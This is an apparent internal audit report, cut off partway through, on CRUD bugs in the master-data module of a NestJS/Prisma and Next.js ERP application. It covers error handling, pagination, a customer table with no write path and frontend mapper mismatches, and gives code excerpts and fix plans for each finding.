# CRUD Surgical Audit — Master Data Cluster

**Auditor scope:** `frontend/src/app/(dashboard)/master/**` · `backend/src/modules/master/**` · `backend/prisma/schema/{finance,warehouse,bussdev,hr}.prisma`
**Date:** 2026-10-01
**Brief:** `docs/audit/_CRUD_AUDIT_BRIEF.md`
**Branch:** `feat/p08-contracts-subject-ownership` · **HEAD:** `07d1cbac`

> **Deploy caveat (applies to every finding).** Production runs SHA `7a449e0a`, 102 commits behind HEAD. Nothing in this ticket is deployed. Treat all findings as *live on HEAD, absent from production*.

---

## 0. Scope actually audited

| Layer | Files | Notes |
|---|---|---|
| FE routes | 17 `page.tsx` under `master/` | 5 are redirects/aliases, 1 is a fossil duplicate |
| FE dead code | 3 `_hooks/*.ts` (1 648 lines) + ~20 `_components/*.tsx` | zero import sites |
| BE controllers | 9 | all type their `@Body` DTO — no `body: any` |
| BE services | 10 | `import-export.service.ts` is 916 lines (cap 400) |
| Prisma | `finance.prisma` `Customer`; `warehouse.prisma` `Supplier`/`Warehouse`/`MasterCategory`/`MaterialItem`; `bussdev.prisma` `SalesLead` | schema is split across 26 files under `backend/prisma/schema/`, **not** `backend/prisma/schema.prisma` |

**Entity boundary (verified, not assumed).** `Customer` (`finance.prisma:273`, `@@map("customers")`) and `SalesLead` (`bussdev.prisma:1`, `@@map("sales_leads")`) are distinct tables with distinct shapes. `SampleRequest`/`WorkOrder`/`NewProductForm` point `leadId` at `sales_leads`. **This ticket does not propose consolidating them.** Finding `C-02` proposes closing the *write-path gap* on `Customer`, not merging it into `SalesLead`.

---

## 📌 Module: Master Data / Global backend error handling

### [MD-01]: No Prisma error code is mapped anywhere in the module — every unique/FK/not-found violation becomes an opaque 500
- **Target Files**:
  - Backend: `backend/src/common/filters/global-exception.filter.ts`, `backend/src/modules/master/services/*.ts`
  - Database: `backend/prisma/schema/warehouse.prisma:61` (`MaterialItem.code @unique`), `:345` (`MasterCategory.code @unique`), `bussdev.prisma:9` (`SalesLead.brandCode @unique`), `warehouse.prisma:391` (`MaterialInventory.internalQrCode @unique`)
- **Severity**: `Critical Bug`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**: The filter special-cases `HttpException` only; every other throw falls into the catch-all:
  ```ts
  // global-exception.filter.ts:70-79
  } else {
    const err = exception as Error;
    this.logger.error(`Unhandled exception on ${request.method} ${request.url}`, err.stack);
    detail = process.env.NODE_ENV === 'production'
      ? 'An unexpected internal error occurred'
      : (err.message ?? detail);
  }
  ```
  Status is pinned to `HttpStatus.INTERNAL_SERVER_ERROR` at `:41-44`. A repo-wide grep for `P2002|P2003|P2025|PrismaClientKnownRequestError` returns **10 hits, none under `modules/master/`** (only `communication`, `marketing`, `wa-self-qr`, `platform/outbox`). The master module therefore has zero unique-collision and zero FK-guard handling. `SalesLead.brandCode` is `@unique`; `CustomersService.create` writes a user-supplied `brandCode` (`customers.service.ts:282`) with no pre-check and no catch — the second customer with the same brand code returns 500 with the body `An unexpected internal error occurred`.
- **Exact Contract Specification**:
  - Request DTO:
    ```json
    { "clientName": "PT Contoh", "brandCode": "BRAND-001" }
    ```
  - Current (wrong) Response DTO — HTTP 500:
    ```json
    { "type": "about:blank", "title": "Internal Server Error", "status": 500,
      "code": "INTERNAL_SERVER_ERROR", "message": "An unexpected internal error occurred" }
    ```
  - Required Response DTO — HTTP 409:
    ```json
    { "type": "https://api.aureon.id/problems/duplicate",
      "title": "Conflict", "status": 409, "code": "DUPLICATE_RESOURCE",
      "message": "brandCode \"BRAND-001\" is already in use",
      "details": { "field": "brandCode", "constraint": "sales_leads_brandCode_key" } }
    ```
- **Actionable Execution Plan**:
  - `backend/src/common/filters/global-exception.filter.ts` — add a `Prisma.PrismaClientKnownRequestError` branch *before* the `HttpException` branch, mapping `P2002`→409 `DUPLICATE_RESOURCE`, `P2003`→409 `FK_CONSTRAINT_VIOLATION` (message names the child table), `P2025`→404 `NOT_FOUND`, `P2014`→422. Use `backend/src/common/exceptions/api-exception.ts` (already imported at `:10`) to build the body.
  - `backend/src/modules/master/services/customers.service.ts:276-297` — pre-check `brandCode` with `findUnique` before `create`, matching the pattern already used correctly in `materials.service.ts:244-253`.
  - `frontend/src/lib/api.ts:82-94` — extend `extractApiError` to return `details` so field-level errors can reach a form.
  - **[Verification]** Posting a duplicate `brandCode` returns HTTP 409 with `code: "DUPLICATE_RESOURCE"` and the UI toast names the offending field instead of "Terjadi kendala pemrosesan pada server."

---

### [MD-02]: Field errors are lost twice — the filter reads the wrong key, and `extractApiError` discards whatever survives
- **Target Files**:
  - Backend: `backend/src/common/filters/global-exception.filter.ts:56-65` · `backend/src/common/factories/validation-error.factory.ts:17-23`
  - Frontend: `frontend/src/lib/api.ts:82-110`
- **Severity**: `Contract Mismatch`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**: The loss happens at **two** layers, and fixing only one leaves the feature broken.

  **Break 1 — backend, wrong key.** `ValidationErrorFactory` writes the per-field array at `fieldErrors`:
  ```ts
  // validation-error.factory.ts:18
  return new BadRequestException({ code: 'VALIDATION_FAILED', message: 'Request validation failed.', fieldErrors: collect(errors) });
  ```
  but the filter only copies `details`:
  ```ts
  // global-exception.filter.ts:64
  if (r.details !== undefined) details = r.details;   // undefined → fieldErrors dropped
  ```
  `r.fieldErrors` is never read. So the response body carries `message: "Request validation failed."` and no field list at all.
  
  **Break 2 — frontend, wrong type.** `extractApiError`'s return type is `{ status: number; message: string; code: string }`. `details` is not destructured, not returned, not consumed. So even once Break 1 is fixed, the client still discards it.
  
  The net user-visible result is the literal string `"Request validation failed."` — a user who submitted an empty `name` and a malformed `phone` and `email` is told only that a validation happened, not which fields or why. The human-message translation table in `api.ts:24-34` never runs for these, because it is reached from the array branch that is itself never populated.
- **Exact Contract Specification**:
  - Expected Response DTO (already produced today, already discarded today):
    ```json
    { "status": 400, "code": "HTTP_400",
      "message": "name must not be empty; phone must be a valid phone; email must be an email",
      "details": { "fieldErrors": [
        { "property": "name",  "message": "name must not be empty" },
        { "property": "email", "message": "email must be an email" } ] } }
    ```
  - Required `extractApiError` return type:
    ```ts
    { status: number; code: string; message: string;
      fieldErrors: Array<{ property?: string; message: string }> }
    ```
- **Actionable Execution Plan**:
  - `backend/src/common/filters/global-exception.filter.ts:64` — read the key the factory actually writes: `if (r.fieldErrors !== undefined) details = { fieldErrors: r.fieldErrors };`. Keep the `r.details` branch too, since other exception bodies use it.
  - `backend/src/common/factories/validation-error.factory.ts:18` — add `property` to each entry, so a client can bind an error to an input rather than parse a sentence.
  - `frontend/src/lib/api.ts:82-110` — widen the return type to `fieldErrors: Array<{ property?: string; message: string }>` and populate it from `rawData?.details?.fieldErrors ?? []`. Move the `"already exists" → "sudah terdaftar"` replacement at `api.ts:33` **out of** the array-only branch so it also applies to the plain-string messages the services throw (e.g. `materials.service.ts:249`).
  - `frontend/src/app/(dashboard)/master/customers/_components/CustomerCreateCanvas.tsx` — bind `fieldErrors` to the matching inputs.
  - **[Verification]** Submitting a blank required field underlines that input with the server's own message. Today the toast is the only signal and it reads "Request validation failed."

---

## 📌 Module: Master Goods / `/master/goods`

### [MD-03]: `/master/goods` renders a permanently empty table — `unwrapResponse` destroys the paginated envelope the page then reads
- **Target Files**:
  - Frontend: `frontend/src/app/(dashboard)/master/goods/page.tsx:161-218`, `frontend/src/lib/unwrap-response.ts:2-6`, `frontend/src/lib/api.ts:129-130`
  - Backend: `backend/src/modules/master/services/materials.service.ts:121-127`
- **Severity**: `Critical Bug`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**: The response interceptor returns the raw axios response (`:130 (response) => response`), so `res = { data: { data: [...], total, page, limit, totalPages }, ... }`. Then:
  ```ts
  // unwrap-response.ts:2-6
  if (response?.data?.data) return response.data.data;   // ← fires: returns the ARRAY
  if (response?.data) return response.data;
  ```
  `res.data.data` is the item array, which is **truthy even when empty** (`[]` is truthy), so `unwrapResponse` returns the array and the pagination metadata is dropped. The page then asks for the envelope that no longer exists:
  ```ts
  // goods/page.tsx:169, 192, 212
  return unwrapResponse(res);                                          // → Array
  if (materialsApiResponse && Array.isArray(materialsApiResponse.data)) // → Array.isArray(undefined) === false
      setServerTotal(materialsApiResponse.total)                        // → undefined
  } else if (!isLoadingMaterials && !isErrorMaterials) {
      setGoodsList([]);                                                // ← always taken
  }
  ```
  Net effect: the query succeeds, `isError` is false, `goodsList` is set to `[]` on every load, and the page falls through to the empty state. The same path makes `serverTotal` stay `null`, so the client-side pagination fallback at `:458-462` slices an already-empty list. This is the flagship master route — `Sidebar.tsx` links `/master/goods` at lines 295, 375 and 593.
- **Exact Contract Specification**:
  - Current (broken) internal value at `page.tsx:169`:
    ```ts
    MasterBarangItem[]   // envelope already unwrapped away
    ```
  - Required internal value:
    ```ts
    { data: MasterBarangItemApi[]; total: number; page: number; limit: number; totalPages: number }
    ```
  - Required Response DTO (`GET /master/materials?page=1&limit=10`):
    ```json
    { "data": [ { "id": "…", "code": "BBK-0001", "name": "Tepung Terigu", "unit": "kg",
                  "unitPrice": "14500.00", "stockQty": "320.00", "minLevel": "50.00",
                  "category": { "id": "…", "code": "BBK", "name": "Bahan Baku" } } ],
      "total": 143, "page": 1, "limit": 10, "totalPages": 15 }
    ```
- **Actionable Execution Plan**:
  - `frontend/src/lib/unwrap-response.ts` — **do not** special-case `data.data`; it is ambiguous between "envelope" and "entity with a `data` field". Reduce it to:
    ```ts
    export function unwrapResponse<T = unknown>(response: unknown): T {
      const body = (response as { data?: unknown } | null)?.data;
      return (body ?? response) as T;
    }
    ```
    Then audit every call site for double-unwrap; the four list pages in `master/` are the only consumers in this cluster and all of them want the **full body**.
  - `frontend/src/app/(dashboard)/master/goods/page.tsx:192` — keep as-is once the envelope survives; `materialsApiResponse.data` then resolves correctly.
  - **[Verification]** `/master/goods` with ≥1 `MaterialItem` renders the rows; the pager shows `143` total entries and page 2 returns a different set. Today it renders "Belum ada data barang" against a populated database.

---

### [MD-04]: Create sends 8 of the form's fields nowhere, and the discarded set includes every credit and legal-entity field
- **Target Files**:
  - Frontend: `frontend/src/app/(dashboard)/master/goods/page.tsx:258-291`
  - Backend: `backend/src/modules/master/dto/material.dto.ts`, `backend/prisma/schema/warehouse.prisma:46-98`
  - Database: `warehouse.prisma:51` (`unitPrice Decimal`), `:55` (`reorderPoint Decimal`), `:61` (`code String? @unique`)
- **Severity**: `Contract Mismatch`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**: `MaterialItem` NOT NULL without a default is `name`, `type`, `unit`, `unitPrice`, `minLevel`, `reorderPoint` — and the payload covers all six (`:262-268`). That part is sound. The defect is the opposite direction: the form collects a category **label**, and the page converts it to a `MaterialType` enum by string-matching the label:
  ```tsx
  // goods/page.tsx:250-256
  const materialTypeFor = (kategori, kode) => {
    const s = `${kategori} ${kode}`.toLowerCase();
    if (s.includes("label")) return "LABEL";
    if (s.includes("box") || s.includes("kardus") || s.includes("dus")) return "BOX";
    if (s.includes("kemasan") || s.includes("packaging") || s.includes("kpr")) return "PACKAGING";
    return "RAW_MATERIAL";
  };
  ```
  A user who files a packaging item under any category not containing those three substrings is silently recorded as `RAW_MATERIAL`. The page's own `ponytail:` comment at `:246-249` concedes the guess. `stockQty` is deliberately withheld (`:272-274`, correct — it would desync the ledger), but `materials/page.tsx:57` collects and sends it anyway (see `MD-05`).
- **Exact Contract Specification**:
  - Request DTO:
    ```json
    { "name": "Karton Box 30x30x20", "code": "KPR-0007", "type": "PACKAGING",
      "unit": "pcs", "unitPrice": 8500, "minLevel": 100, "reorderPoint": 200,
      "physicalForm": "Karton", "categoryId": "3f2b…-uuid" }
    ```
- **Actionable Execution Plan**:
  - `backend/src/modules/master/dto/material.dto.ts` — add `categoryId` to `CreateMaterialDto`/`UpdateMaterialDto` if absent, and expose the `MaterialType` enum values via `@ApiPropertyOptional({ enum: [...] })` so Swagger documents them.
  - `frontend/src/app/(dashboard)/master/goods/page.tsx:250-256` — replace `materialTypeFor` with a `<select>` bound to the real enum, seeded from a `GET /master/material-type` or a static const that mirrors the Prisma enum. Keep `categoryId` as the authoritative field.
  - `frontend/src/app/(dashboard)/master/goods/page.tsx:272-274` — leave the `stockQty` omission in place; it is the correct call.
  - **[Verification]** Creating a packaging item stores `type: "PACKAGING"` regardless of which category it was filed under.

---

### [MD-05]: `/master/materials` is a live fossil duplicate of `/master/goods` that writes the one field `/master/goods` deliberately refuses to write
- **Target Files**:
  - Frontend: `frontend/src/app/(dashboard)/master/materials/page.tsx` (394 lines) vs `frontend/src/app/(dashboard)/master/goods/page.tsx` (1 179 lines)
  - Backend: `backend/src/modules/master/controllers/materials.controller.ts:71, 117-119`
- **Severity**: `Critical Bug`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**: Both routes hit the same endpoint with different contracts and **contradictory write policies**:
  | | `/master/goods` | `/master/materials` |
  |---|---|---|
  | query | `?page=1&limit=10` (`:165-166`) | `?search=…` only (`:70`) — server caps at `limit = 50` (`materials.service.ts:25`) |
  | shape | expects `{data,total,page,limit,totalPages}` (`:192`) | accepts array-or-`data` (`:72`) |
  | stock | `stockQty` **deliberately not sent**, with a `ponytail:` note that writing it "would set on-hand stock with no inventory ledger entry" (`:272-274`) | `stockQty` collected (`:57`) and written (`:78`) |
  | verb | `PATCH /master/materials/:id` (`:276`) | `PUT /master/materials/:id` (`:89`) |
  Neither page links to the other; `Sidebar.tsx` links only `/master/goods` (295, 375, 593). `/master/materials` is reachable only by typing the URL, and `ROUTE_MAP.md` does not list it. Because it sends no `page`/`limit`, it silently renders at most 50 of N items with **no pager and no truncation notice**. Because it writes `stockQty`, the on-hand quantity diverges from the inventory ledger that the goods page's comment says must stay authoritative. Note the controller maps **both** `@Put(':id')` (`:117-119`) and `@Patch(':id')` (`:123-125`) to the same partial-update handler, so the PUT is accepted despite PUT's replace semantics.
- **Actionable Execution Plan**:
  - Delete `frontend/src/app/(dashboard)/master/materials/page.tsx` and add `redirect('/master/goods')` if the URL must keep resolving — matching the pattern already used by `categories/page.tsx:13`, `vendors/page.tsx:13`, `users/page.tsx:4`.
  - `backend/src/modules/master/controllers/materials.controller.ts:117-119` — drop `@Put(':id')`; keep `@Patch(':id')` as the only update verb so a future full-replace client cannot silently get partial-update semantics.
  - `docs/ROUTE_MAP.md` — record the redirect.
  - **[Verification]** `/master/materials` lands on `/master/goods`; no second page can write `stockQty` without a goods receipt.

---

## 📌 Module: Master Customers / `/master/customers`

### [MD-06]: The `customers` table has no write path in the entire backend — three NOT NULL foreign keys point at it, so sales invoices, AR receipts and escrows cannot be created
- **Target Files**:
  - Backend: `backend/src/modules/master/services/customers.service.ts:278, 331, 365` · `backend/src/modules/master/services/import-export.service.ts:640`
  - Database: `backend/prisma/schema/finance.prisma:273-294` (`Customer`), `:300` (`SalesInvoice.customerId`), `:346` (`ARReceipt.customerId`), `:577` (`ClientEscrow.customerId`)
- **Severity**: `Critical Bug`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**: **Verified, not assumed.** A repo-wide grep for `prisma.customer.|tx.customer.|customer.create|customer.update|customer.upsert|customer.delete` across `backend/src` returns **5 hits, all `findUnique`, all in `modules/finance/`** (`ar-receipts.service.ts:68`, `cash.service.ts:248`, `client-escrows.service.ts:53`, `sales-invoices.service.ts:63`, `finance-invoice.service.ts:79`). Zero writes. Every write on the "customer" path targets `SalesLead` instead:
  ```ts
  // customers.service.ts:278   create
  return this.prisma.salesLead.create({ data: { clientName: …, brandName: …, brandCode: … } });
  // customers.service.ts:331   update
  return this.prisma.salesLead.update({ where: { id }, data: { … } });
  // customers.service.ts:365   remove (soft: status → LOST)
  return this.prisma.salesLead.update({ where: { id }, data: { status: 'LOST' } });
  // import-export.service.ts:640  import — same target
  await tx.salesLead.create({ data: { clientName: …, source: 'IMPORT', … } });
  ```
  Meanwhile the finance side reads the other table:
  ```prisma
  // finance.prisma:273-294
  model Customer {
    id String @id @default(uuid()) @db.Uuid
    code String @unique          // NOT NULL, no default
    name String                  // NOT NULL, no default
    creditLimit Decimal @default(0) @db.Decimal(15, 2)
    paymentTerms Int @default(30)
    isActive Boolean @default(true)
    invoices  SalesInvoice[]
    receipts  ARReceipt[]
    escrow    ClientEscrow[]
    @@map("customers")
  }
  // :300 / :346 / :577 — all three are `String @db.Uuid` with no `?` and no default
  ```
  So `POST /master/customers` returns 201 and the `/master/customers` grid fills — while the three finance tables that need a `customers` row can never get one. This is **forward-looking risk, not incurred loss**: per prior measurement, the production ERP side is empty (179 of 195 tables), so no finance document has been lost. It becomes an outage the moment anyone posts the first sales invoice.
  This is **not** a proposal to merge `Customer` into `SalesLead`. They are separate entities with separate purposes (a CRM lead vs. a finance account party). The gap is that the *finance* entity has no CRUD surface at all.
- **Exact Contract Specification**:
  - Currently-served request DTO (`POST /master/customers`), which writes the wrong table:
    ```json
    { "clientName": "PT Contoh Jaya", "brandName": "Contoh", "phone": "0812…" }
    ```
    Current response (a `SalesLead` row, `{success, data}` never applied):
    ```json
    { "id": "…", "clientName": "PT Contoh Jaya", "brandName": "Contoh",
      "status": "NEW_LEAD", "picId": "…", "createdAt": "2026-10-01T…" }
    ```
  - Required contract for the finance entity — a separate resource, so the two never collide:
    ```json
    POST /master/finance-customers
    { "organizationId": "…-uuid", "name": "PT Contoh Jaya", "brand": "Contoh",
      "npwp": "01.234.567.8-901.000", "creditLimit": "50000000.00",
      "paymentTerms": 30, "phone": "0812…", "email": "ar@contoh.co.id" }
    ```
    ```json
    { "success": true, "data": { "id": "…", "code": "CUST-0001", "name": "PT Contoh Jaya",
      "creditLimit": "50000000.00", "paymentTerms": 30, "isActive": true } }
    ```
- **Actionable Execution Plan**:
  - `backend/src/modules/master/services/customers.service.ts` — **do not** repoint it. Create `backend/src/modules/master/services/finance-customers.service.ts` implementing CRUD on `prisma.customer`, with `code` generated in a `prisma.$transaction` against `masterKode` (`documentType: 'CUSTOMER'`, the pattern already proven at `categories.service.ts:39-60`).
  - `backend/src/modules/master/controllers/customers.controller.ts` — add `@Controller('master/finance-customers')` with the four verbs; keep the existing `/master/customers` routes and their `SalesLead` semantics, and add a doc comment stating that this resource is the CRM lead and **not** the finance account party.
  - `backend/src/modules/master/dto/customer.dto.ts` — add `CreateFinanceCustomerDto` / `UpdateFinanceCustomerDto`; `code` must be server-generated, never client-supplied.
  - `backend/src/modules/finance/sales-invoices/sales-invoices.service.ts:63` and the other four readers — repoint their `customerId` source to the new resource and add a `name` uniqueness or `code` lookup so a lead can be promoted to a customer explicitly.
  - **[Verification]** `SELECT count(*) FROM customers` goes from 0 to 1 after creating a customer through the new endpoint, and that id can then be used as `SalesInvoice.customerId`. Today that INSERT fails with an FK violation no UI can trigger.

---

### [MD-07]: The customers grid reads six fields the API never returns and overwrites ten computed ones with constants — the whole page is fiction
- **Target Files**:
  - Frontend: `frontend/src/app/(dashboard)/master/customers/page.tsx:140-166`
  - Backend: `backend/src/modules/master/services/customers.service.ts:100-137`
- **Severity**: `Contract Mismatch`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**: The backend returns a hand-built object with `customerCode`, `nama`/`clientName`, `pic` as a **string**, `kategori`, `status`, and eleven derived figures. The page's mapper reads a different set of key names and discards the derived ones:
  ```tsx
  // customers/page.tsx:140-166
  const mapped = apiCustomers.map((c: any) => ({
    customerCode: c.code || `CUST-${c.id.substring(0, 4)}`,   // API sends `customerCode`, not `code`
    nama: c.name || c.clientName || "-",                        // `name` absent; `clientName` present → OK by luck
    pic: c.pic?.name || c.name || "-",                          // `pic` is a STRING; `.name` is undefined → always "-"
    kategori: (c.notes?.match(/Kategori:\s*([^|]+)/)?.[1]?.trim() as any) || "Calon Pelanggan",  // `notes` never returned
    penginput: c.notes?.match(/Penginput:…/)… || "Admin",       // `notes` never returned
    status: c.status === "ACTIVE" || c.isActive ? "ACTIVE" : "INACTIVE",  // `isActive` absent
    nominalSoProduk: 0,   // API computed 127
    soSampleCount: 0,     // API computed 126
    soProdukCount: 0,     // API computed 127
    sampleFeeTotal: 0,    // API computed 128
    sampleStatus: "-",    // API computed 129
    produksiStatus: "-",  // API computed 131
    legalitasBpom: "Belum Diajukan",   // API computed 132
    legalitasHalal: "Belum",          // API computed 133
    legalitasHki: "Belum",            // API computed 134
    escrowDeposit: 0,     // API computed 135
  }));
  ```
  Concretely: **every KPI card is permanently zero** (`totalSampleFee` at `:295-298` and `totalProduksiSo` at `:299-302` sum a list that was zeroed two steps earlier), `kategori` is always the literal "Calon Pelanggan", `penginput` is always "Admin", and the PIC column is always `-`. The service computes `kategori` from the SO/sample profile at `:87-98` and returns it; the page never reads it.
- **Exact Contract Specification**:
  - Actual Response DTO (one element of `GET /master/customers`):
    ```json
    [{ "id": "…", "customerCode": "BRAND-001", "nama": "PT Contoh Jaya", "clientName": "PT Contoh Jaya",
       "brandName": "Contoh", "brandCode": "BRAND-001", "pic": "Andi", "penginput": "Andi", "picId": "…",
       "phone": "0812…", "contactInfo": "0812…", "email": "ar@contoh.co.id", "birthDate": null,
       "city": "Surabaya", "kota": "Surabaya", "province": "Jawa Timur", "provinsi": "Jawa Timur",
       "addressDetail": "Jl. …", "alamatLengkap": "Jl. …",
       "kategori": "Pelanggan RO", "categoryId": "…", "category": { "id": "…", "code": "RO", "name": "…" },
       "contractType": "Jasa Maklon", "status": "ACTIVE",
       "soSampleCount": 4, "soProdukCount": 12, "nominalSoProduk": 187500000,
       "sampleFeeTotal": 3000000, "sampleStatus": "Sample NEGOTIASI",
       "produksiBatchTotal": 12, "produksiStatus": "SO IN_PRODUCTION",
       "legalitasBpom": "Terbit", "legalitasHalal": "Sertifikasi Aktif", "legalitasHki": "Terdaftar Resmi",
       "escrowDeposit": 25000000, "createdAt": "2026-09-01T…" }]
    ```
  - Mapper contract: the page must consume **exactly** these keys. No `c.code`, no `c.notes`, no `c.isActive`, no `c.pic.name`.
- **Actionable Execution Plan**:
  - `frontend/src/app/(dashboard)/master/customers/page.tsx:140-166` — delete the mapper entirely and let the typed API response flow straight into `MasterCustomerItem`; if a rename is wanted, do it in `customers.service.ts`, not in the page.
  - `frontend/src/app/(dashboard)/master/customers/_types/customer.types.ts` — declare the response interface from the JSON above so the mismatch becomes a compile error.
  - **[Verification]** `totalSampleFee` and `totalProduksiSo` show non-zero values; the kategori column shows "Pelanggan RO"/"Pelanggan Sample"/etc.; the PIC column shows the sales rep's name.

---

### [MD-08]: The list endpoint returns a bare array with no pagination while the page paginates client-side — 4 of 5 master lists dump every row
- **Target Files**:
  - Frontend: `frontend/src/app/(dashboard)/master/customers/page.tsx:128-136, 391-397`
  - Backend: `backend/src/modules/master/services/customers.service.ts:30-69`
  - Database: `bussdev.prisma:78` — `@@index([picId, status, createdAt])`, the only index supporting this query
- **Severity**: `Contract Mismatch`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**: `findAll` has **no `take`, no `skip`, no `count`**, and eagerly `include`s four relations per row — `pic`, `category`, `salesOrders` (**unbounded**, `:39-48`), `sampleRequests` (**unbounded**, `:49-58`), `registrations` (`:59-66`). The page then slices what it already downloaded:
  ```tsx
  // customers/page.tsx:393-397
  const totalPages = Math.ceil(totalEntries / pageSize) || 1;   // totalEntries = filteredCustomers.length
  const paginatedCustomers = useMemo(() => {
    const start = (currentPage - 1) * pageSize;
    return filteredCustomers.slice(start, start + pageSize);
  }, …);
  ```
  The same shape holds across the cluster: `suppliers.service.ts:50-58` (no `take`/`skip`), `warehouses.service.ts:12-20` (no `take`/`skip`), `categories.service.ts:10-13` (no `take`/`skip`). Only `materials.service.ts:47-127` paginates properly, and `personnel.service.ts:109-137` returns full metadata. `QuerySupplierDto` (`supplier.dto.ts:204-217`) even **declares** `page`/`limit` with `@Min(1)`/`@Max(200)` — and `findAll` ignores both. Every page, on every keystroke of the search box, ships the entire table plus all child rows.
  There is also a no-op in the shape mismatch: `CustomerQueryDto` declares `myOnly` (`customer.dto.ts:20-21`) and the page owns a `scopeFilter` state (`customers/page.tsx:82`) — `findAll` reads neither.
- **Exact Contract Specification**:
  - Required Response DTO, matching the one service that is already correct:
    ```json
    { "data": [ /* … */ ], "total": 412, "page": 2, "limit": 10, "totalPages": 42 }
    ```
    (align the key name with `materials.service.ts:122` — `data`, not `items`.)
  - Required Request DTO: `page` (default 1), `limit` (default 10, `@Max(200)`), `search`, `status`, `picId`, `categoryId`, `sortBy`, `sortDir`.
- **Actionable Execution Plan**:
  - `backend/src/modules/master/services/customers.service.ts:30-69` — add `const page/limit/skip` clamping identical to `materials.service.ts:24-26`, add `take: limit` to the root query **and to the `salesOrders`/`sampleRequests` sub-selects** (use the last-N form already used in `findOne:182-183`), run `Promise.all([count, findMany])`, and return `{ data, total, page, limit, totalPages }`.
  - `backend/src/modules/master/services/suppliers.service.ts:50-58` and `warehouses.service.ts:12-20` and `categories.service.ts:10-13` — same change.
  - `frontend/src/app/(dashboard)/master/customers/page.tsx:128-136` — pass `page`/`limit` in the query, key on `["master-customers", currentPage, pageSize, searchQuery]`, consume the envelope, delete the `.slice()` at `:394-397`.
  - **[Verification]** With 412 customers, `GET /master/customers?page=2&limit=10` returns 10 rows and `"total": 412`; the network tab no longer shows a multi-megabyte response when typing in the search box.

---

### [MD-09]: `findAll` and `findOne` compute `kategori` by different rules, and `findOne`'s counts are truncated by its own `take`
- **Target Files**:
  - Backend: `backend/src/modules/master/services/customers.service.ts:87-98` vs `:224`; `:182-194` vs `:30-69`
- **Severity**: `Contract Mismatch`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**: The list derives `kategori` from the commercial profile:
  ```ts
  // :87-98
  let kategoriLabel = lead.category?.name;
  if (!kategoriLabel) {
    if (soProdukCount > 1) kategoriLabel = 'Pelanggan RO';
    else if (soProdukCount === 1) kategoriLabel = 'Pelanggan Produk';
    else if (soSampleCount > 0) kategoriLabel = 'Pelanggan Sample';
    else kategoriLabel = 'Calon Pelanggan';
  }
  ```
  The detail endpoint does not — it hardcodes the first rung: `kategori: lead.category?.name || 'Calon Pelanggan'` (`:224`). A customer with one sales order and no `MasterCategory` reads **"Pelanggan Produk"** in the grid and **"Calon Pelanggan"** in the drawer opened from that same row. Separately, `findOne` loads `salesOrders` with `take: 10` and `sampleRequests` with `take: 10` (`:182-183`) and then derives counts from the truncated arrays:
  ```ts
  // :190-195
  const nominalSoProduk = lead.salesOrders.reduce(…);   // sums at most 10 orders
  const soSampleCount  = lead.sampleRequests.length;   // max 10
  const soProdukCount  = lead.salesOrders.length;      // max 10
  ```
  The list, which has no `take`, reports 34. The detail drawer reports 10 and a revenue total missing 24 orders.
- **Actionable Execution Plan**:
  - `backend/src/modules/master/services/customers.service.ts` — extract the two mapping bodies into one private `toCustomerView(lead, { salesOrders, sampleRequests })` and call it from both `findAll` and `findOne`; delete the duplicated literal at `:100-137` / `:204-245` (the two copies already differ on `kategori`).
  - In `findOne`, replace the array-length counts with a real `prisma.salesLead.count({ where: { id } })` per relation, or `_count` on the `findUnique` select.
  - **[Verification]** A customer with 34 orders shows `soProdukCount: 34` and the same `nominalSoProduk` in the grid and in the drawer.

---

### [MD-10]: The `status` ternary has a dead branch — every non-LOST lead reports ACTIVE
- **Target Files**:
  - Frontend: `frontend/src/app/(dashboard)/master/customers/page.tsx:157`
  - Backend: `backend/src/modules/master/services/customers.service.ts:124` and `:228`
  - Database: `bussdev.prisma:14` — `status WorkflowStatus @default(NEW_LEAD)`
- **Severity**: `Broken UX State`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**:
  ```ts
  // customers.service.ts:124
  status: lead.status === 'WON_DEAL' ? 'ACTIVE' : lead.status === 'LOST' ? 'INACTIVE' : 'ACTIVE',
  ```
  The first arm is unobservable — its result equals the fallback. So a lead at `NEW_LEAD` (the schema default, `bussdev.prisma:14`) is presented to the user as an **ACTIVE CUSTOMER**. The page compounds it: the create form initialises `status: "ACTIVE"` (`:277`) and the "Active" filter therefore matches every row in the table, making the filter useless. The form is at least honest that it cannot set the column — the `ponytail:` note at `:193-196` says `status` is deliberately not sent, which is the correct call given there is no ACTIVE/INACTIVE in `WorkflowStatus`.
- **Actionable Execution Plan**:
  - `backend/src/modules/master/services/customers.service.ts:124` and `:228` — replace with an explicit three-way map that does not collapse: `NEW_LEAD|QUALIFIED|SAMPLE_REQUESTED|NEGOTIATION` → `'PROSPECT'`, `WON_DEAL` → `'ACTIVE'`, `LOST` → `'INACTIVE'`.
  - `frontend/src/app/(dashboard)/master/customers/page.tsx:157` — map from the new vocabulary; make the status filter offer those three values and default to `ALL`.
  - **[Verification]** A freshly created lead appears as "PROSPECT", not "ACTIVE"; the Active filter returns only won deals.

---

### [MD-11]: The update endpoint silently drops every field set to the empty string, and a blank name looks like a successful edit
- **Target Files**:
  - Backend: `backend/src/modules/master/services/customers.service.ts:331-358`
  - Frontend: `frontend/src/app/(dashboard)/master/customers/_components/CustomerCreateCanvas.tsx` (onSave payload, `:181-192`)
- **Severity**: `Missing Validation`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**: Every field is applied through a guarded spread, so `""` is a no-op rather than a clear:
  ```ts
  // customers.service.ts:337-352
  ...(dto.clientName !== undefined && { clientName: dto.clientName }),
  ...(dto.phone       !== undefined && { phone: dto.phone }),
  ...(dto.email       !== undefined && { email: dto.email }),
  ...
  ```
  An operator who clears a phone number to "remove it" gets HTTP 200 and a success toast, and the number is still there. The inverse also holds: the form sends `""` for every unfilled optional input, so **a partial edit re-submits blanks that are then silently ignored** — which is what hides the defect. Worse, `brandCode` is resolved once at create (`:276`) and then re-resolved on update, so a row that already owns `BRAND-001` can be edited back into a `CUST-####` fallback and collide with a genuine row.
  Additionally, `taxId` is destructured and thrown away in both directions — it is absent from the create `data` (`:282-293`) and from the update spreads (`:337-352`), so the column can never be set through the API.
